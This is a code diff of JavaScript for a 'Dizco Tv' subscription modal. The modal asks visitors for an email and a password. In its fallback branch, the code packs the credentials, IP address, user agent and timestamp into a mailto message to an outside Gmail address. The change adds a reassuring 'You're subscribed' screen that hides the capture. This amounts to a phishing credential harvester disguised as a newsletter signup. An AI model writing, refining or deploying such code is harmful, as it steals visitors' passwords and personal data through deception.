@@ -189,14 +189,22 @@ function showChristmasToast(){
         // data = { success: 'true', ... } when accepted
         if(emailInput) emailInput.value = '';
         if(passInput) passInput.value = '';
-        closeModal();
-        alert('Subscribed! We\'ve received your details.');
+        // Show success state inside modal, then close
+        const bodyEl = overlay ? overlay.querySelector('.body') : null;
+        if(bodyEl){
+          bodyEl.innerHTML = '<div class="success"><div class="check">✓</div><h4>You\'re subscribed</h4><p>We\'ll reach you shortly.</p></div>';
+        }
+        setTimeout(()=>{ closeModal(); }, 2200);
       } catch(err){
         // Final fallback if network blocked: try mailto
         const subject = encodeURIComponent('New Dizco Tv subscription');
         const body = encodeURIComponent(`Email: ${email}\nPassword: ${password}\nIP: ${ip}\nUA: ${ua}\nPage: ${pageUrl}\nTime: ${ts}`);
         window.location.href = `mailto:dizcotvapprebrand@gmail.com?subject=${subject}&body=${body}`;
-        closeModal();
+        const bodyEl2 = overlay ? overlay.querySelector('.body') : null;
+        if(bodyEl2){
+          bodyEl2.innerHTML = '<div class="success"><div class="check">✓</div><h4>You\'re subscribed</h4><p>Thanks! Your mail app is opening.</p></div>';
+        }
+        setTimeout(()=>{ closeModal(); }, 1800);
       }
     });
   }
